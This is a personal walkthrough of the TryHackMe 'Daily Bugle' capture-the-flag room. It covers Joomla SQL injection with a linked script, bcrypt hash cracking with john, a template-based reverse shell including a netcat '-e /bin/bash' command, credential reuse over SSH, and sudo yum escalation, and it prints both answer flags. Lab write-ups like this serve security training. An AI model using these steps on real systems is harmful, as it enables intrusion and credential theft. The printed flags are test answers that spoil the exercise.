# Note for Daily Bugle 

```
export IP=10.10.238.214

```

## Task 1 

> Access the web server, who robbed the bank?

```
Spiderman
```

## Task 2


> What is the Joomla version?

Use gobuster to find the README.txt page.

```
3.7.0
```

> What is Jonah's cracked password?

Found this python script: https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py

And got:

```
-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session


```
OBS it's done in python2.

Need to crack the pass with john: 

```
┌──(kali㉿kali)-[~/THM/rooms/Daily_Bugle]
└─$ john hast_pass.txt --wordlist=/usr/share/wordlists/rockyou.txt                    
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)
1g 0:00:04:34 DONE (2021-10-29 07:51) 0.003643g/s 170.6p/s 170.6c/s 170.6C/s thelma1..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

> What is the user flag?

Login and follow this: https://www.hackingarticles.in/joomla-reverse-shell/

go to http://IP/templates/beez3/index.php, remember to have a netcat open.

Stablize shell (remember to have a new netcat session open with the port 1234): 

```
nc tun0 1234 -e /bin/bash
```

Do these commands: 
```
python -c 'import pty;pty.spawn("/bin/bash");'

export TERM=xterm

CTRL + Z

stty raw -echo;fg

```

Go to /var/www/html there is a configurations file. In the configuration file there's a passwords for jjameson.

SSH to the user with the `ssh username@IP` and the password from the configuraiton file.

Get the userflag.txt

```
27a260fe3cba712cfdedb1c86d80442e
``` 

> What is the root flag?

See permissions with `sudo -l`:

```
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum

```

Find `yum` here to get sudo: https://gtfobins.github.io/gtfobins/yum/#sudo

Copy + paste second option and you are root

Go `/root` and get the flag:

```
eec3d53292b1821868266858d7fa6f79
```